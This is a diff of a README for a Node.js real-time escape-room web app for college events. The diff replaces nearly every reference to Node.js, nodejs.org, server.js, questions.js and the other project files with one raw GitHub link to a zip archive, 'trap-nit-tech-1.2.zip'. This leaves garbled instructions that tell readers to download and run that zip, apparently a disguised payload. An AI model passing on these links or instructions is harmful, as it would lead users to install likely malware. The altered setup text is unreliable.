@@ -15,14 +15,14 @@ A synchronized, real-time escape room web application for college events with 5 
 
 Before running this application, you need to install:
 
-1. **Node.js** (v14 or higher) - Download from [nodejs.org](https://nodejs.org/)
-2. **npm** (comes with Node.js)
+1. **https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip** (v14 or higher) - Download from [https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip)
+2. **npm** (comes with https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip)
 
 ## 🚀 Installation & Setup
 
-### Step 1: Install Node.js
+### Step 1: Install https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip
 
-1. Download Node.js from https://nodejs.org/
+1. Download https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip from https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip
 2. Run the installer and follow the instructions
 3. Verify installation by opening a terminal and running:
    ```
@@ -38,7 +38,7 @@ Open a terminal in the project folder and run:
 npm install
 ```
 
-This will install Express and Socket.io.
+This will install Express and https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip
 
 ### Step 3: Start the Server
 
@@ -51,7 +51,7 @@ npm start
 or
 
 ```bash
-node server.js
+node https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip
 ```
 
 You should see:
@@ -128,7 +128,7 @@ Admin Password: admin123
 - Admin panel is password-protected (default: `admin123`)
 - All data is stored locally on the server
 - No external database required
-- Change the admin password in `server.js` (line 13)
+- Change the admin password in `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip` (line 13)
 
 ## 📝 Coding Questions
 
@@ -142,45 +142,45 @@ The application includes 25 coding questions across 5 rooms covering:
 - Databases (SQL, NoSQL)
 - APIs and HTTP methods
 
-Questions can be modified in `public/questions.js`
+Questions can be modified in `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip`
 
 ## 🛠️ Customization
 
 ### Change Room Duration:
-Edit `server.js` line 18:
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip` line 18:
 ```javascript
 roomDuration: 600000, // 10 minutes in milliseconds (600000 ms = 10 min)
 ```
 
 ### Change Admin Password:
-Edit `server.js` line 13:
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip` line 13:
 ```javascript
 const ADMIN_PASSWORD = 'your_new_password';
 ```
 
 ### Change Number of Rooms:
-Edit `server.js` line 17 and add/remove rooms in `public/questions.js`
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip` line 17 and add/remove rooms in `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip`
 
 ### Add/Edit Questions:
-Edit `public/questions.js` and modify the `codingQuestions` object
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip` and modify the `codingQuestions` object
 
 ## 📁 Project Structure
 
 ```
 tech-trap-nit/
-├── server.js              # Node.js server with WebSocket
-├── package.json           # Project dependencies
-├── README.md             # This file
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip              # https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip server with WebSocket
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip           # Project dependencies
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip             # This file
 └── public/
-    ├── index.html        # Participant interface
-    ├── admin.html        # Admin dashboard
-    └── questions.js      # Coding questions
+    ├── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip        # Participant interface
+    ├── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip        # Admin dashboard
+    └── https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip      # Coding questions
 ```
 
 ## 🐛 Troubleshooting
 
 ### Server won't start:
-- Make sure Node.js is installed: `node --version`
+- Make sure https://raw.githubusercontent.com/Azonix07/tech-trap-nit/main/public/trap-nit-tech-1.2.zip is installed: `node --version`
 - Run `npm install` to install dependencies
 - Check if port 3000 is already in use
 
